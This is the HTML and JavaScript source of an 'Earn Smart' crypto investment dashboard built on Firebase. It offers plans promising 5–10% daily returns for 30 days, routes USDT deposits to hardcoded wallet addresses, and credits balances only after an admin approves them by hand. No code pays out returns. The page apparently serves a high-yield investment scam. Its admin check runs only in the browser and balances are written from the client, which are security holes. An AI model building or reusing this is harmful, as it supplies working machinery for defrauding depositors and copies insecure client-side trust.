<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Earn Smart - Pro Fintech</title>

<style>
body{
  margin:0;
  font-family:'Segoe UI',sans-serif;
  background:linear-gradient(135deg,#0f172a,#1e293b,#334155);
  color:white;
  overflow-x:hidden;
}

.dollar{
  position:fixed;
  top:-50px;
  color:silver;
  font-size:20px;
  animation:fall linear infinite;
  opacity:0.4;
}
@keyframes fall{to{transform:translateY(110vh);}}

.container{padding:20px;max-width:1000px;margin:auto;}

.card{
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(10px);
  padding:20px;
  border-radius:15px;
  margin-bottom:20px;
  box-shadow:0 0 20px rgba(192,192,192,0.2);
}

button{
  padding:10px;
  border:none;
  border-radius:8px;
  cursor:pointer;
  font-weight:bold;
}

.activate-btn{background:#22c55e;color:white;}
.approve-btn{background:#22c55e;color:white;}
.reject-btn{background:#ef4444;color:white;}

input,select{
  width:100%;
  padding:10px;
  margin:8px 0;
  border-radius:8px;
  border:none;
}

.wallet-box{
  background:#0f172a;
  padding:10px;
  border-radius:8px;
  word-break:break-all;
}

.hidden{display:none;}
</style>
</head>
<body>

<script>
for(let i=0;i<25;i++){
let span=document.createElement("span");
span.className="dollar";
span.innerText="$";
span.style.left=Math.random()*100+"vw";
span.style.animationDuration=(5+Math.random()*5)+"s";
document.body.appendChild(span);
}
</script>

<div class="container">

<h2>Earn Smart Dashboard</h2>

<div class="card">
<h3>Balance: $<span id="balance">0</span></h3>
</div>

<!-- STEP 1 SELECT PLAN -->
<div class="card">
<h3>Select Investment Plan</h3>

<select id="planSelect">
<option value="">Select Plan</option>
<option value="starter">Starter - $5 (5% daily 30 days)</option>
<option value="silver">Silver - $10 (5% daily 30 days)</option>
<option value="diamond">Diamond - $20 (10% daily 30 days)</option>
</select>

<select id="networkSelect">
<option value="">Select Network</option>
<option value="trc20">USDT TRC20</option>
<option value="bsc">BSC BEP20</option>
<option value="erc20">USDT ERC20</option>
</select>

<button onclick="generateDeposit()">Generate Deposit Address</button>

<div id="walletSection" class="hidden">
<div class="wallet-box" id="walletAddress"></div>
<button onclick="copyWallet()">Copy Wallet</button>

<p id="requiredAmount"></p>

<input type="number" id="depositAmount" placeholder="Enter Amount Sent">
<button onclick="submitDeposit()">Submit Deposit</button>
</div>
</div>

<!-- STEP 2 ACTIVATE PLAN -->
<div class="card">
<h3>Activate Plan After Approval</h3>
<button class="activate-btn" onclick="activatePlan()">Activate Investment</button>
</div>

<!-- ADMIN PANEL -->
<div id="adminPanel" class="card hidden">
<h3>Admin Approve Panel</h3>
<div id="depositRequests"></div>
</div>

</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { getDatabase, ref, push, onValue, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAZP0UPvfCgiiir2zKLMae25dUpVcyP3iw",
  authDomain: "crypto-gainz-3524d.firebaseapp.com",
  databaseURL: "https://crypto-gainz-3524d-default-rtdb.firebaseio.com",
  projectId: "crypto-gainz-3524d",
  storageBucket: "crypto-gainz-3524d.firebasestorage.app",
  messagingSenderId: "270349829717",
  appId: "1:270349829717:web:6e3e2bf25f9ab60b2a76dc"
};

const ADMIN_EMAIL="earnsmartapps@gmail.com"; // change this

const app=initializeApp(firebaseConfig);
const auth=getAuth(app);
const db=getDatabase(app);

let selectedWallet="";
let selectedPlan="";
let selectedAmount=0;

/* AUTH */
onAuthStateChanged(auth,(user)=>{
if(!user){window.location="index.html";return;}

onValue(ref(db,'users/'+user.uid),(snap)=>{
document.getElementById("balance").innerText=
(snap.val()?.balance||0).toFixed(2);
});

if(user.email===ADMIN_EMAIL){
document.getElementById("adminPanel").classList.remove("hidden");
loadDeposits();
}
});

/* GENERATE DEPOSIT */
window.generateDeposit=()=>{
selectedPlan=document.getElementById("planSelect").value;
const network=document.getElementById("networkSelect").value;

if(!selectedPlan||!network) return alert("Select plan & network");

if(selectedPlan==="starter") selectedAmount=5;
if(selectedPlan==="silver") selectedAmount=10;
if(selectedPlan==="diamond") selectedAmount=20;

if(network==="trc20") selectedWallet="TKJAvkyjdDSzKtS1HihiKno1tTfi2bTJJe";
if(network==="bsc") selectedWallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
if(network==="erc20") selectedWallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";

document.getElementById("walletAddress").innerText=selectedWallet;
document.getElementById("requiredAmount").innerText="Send exactly $" + selectedAmount;
document.getElementById("walletSection").classList.remove("hidden");
};

window.copyWallet=()=>{
navigator.clipboard.writeText(selectedWallet);
alert("Wallet Copied!");
};

/* SUBMIT DEPOSIT */
window.submitDeposit=async()=>{
const user=auth.currentUser;
const amount=parseFloat(document.getElementById("depositAmount").value);

if(amount!==selectedAmount)
return alert("Amount must match selected plan");

await push(ref(db,'deposits'),{
uid:user.uid,
plan:selectedPlan,
amount,
status:"pending",
date:Date.now()
});

alert("Deposit submitted. Wait for admin approval.");
};

/* ACTIVATE PLAN */
window.activatePlan=async()=>{
const user=auth.currentUser;
const userRef=ref(db,'users/'+user.uid);
const snap=await get(userRef);
let balance=snap.val()?.balance||0;

if(balance<selectedAmount)
return alert("Deposit not approved yet");

await update(userRef,{balance:balance-selectedAmount});

await push(ref(db,'investments/'+user.uid),{
plan:selectedPlan,
amount:selectedAmount,
startDate:Date.now(),
paid:false
});

alert("Investment Activated!");
};

/* ADMIN PANEL */
function loadDeposits(){
onValue(ref(db,'deposits'),(snap)=>{
const data=snap.val();
let html="";
for(const id in data){
const d=data[id];
if(d.status==="pending"){
html+=`
<div>
User: ${d.uid}<br>
Plan: ${d.plan}<br>
Amount: $${d.amount}<br>
<button class="approve-btn" onclick="approveDeposit('${id}','${d.uid}',${d.amount})">Approve</button>
<button class="reject-btn" onclick="rejectDeposit('${id}')">Reject</button>
</div><hr>`;
}
}
document.getElementById("depositRequests").innerHTML=html||"No pending deposits";
});
}

window.approveDeposit=async(id,uid,amount)=>{
const userRef=ref(db,'users/'+uid);
const snap=await get(userRef);
let bal=snap.val()?.balance||0;

await update(userRef,{balance:bal+amount});
await update(ref(db,'deposits/'+id),{status:"approved"});
alert("Deposit Approved");
};

window.rejectDeposit=async(id)=>{
await update(ref(db,'deposits/'+id),{status:"rejected"});
alert("Rejected");
};

</script>
</body>
                            </html>
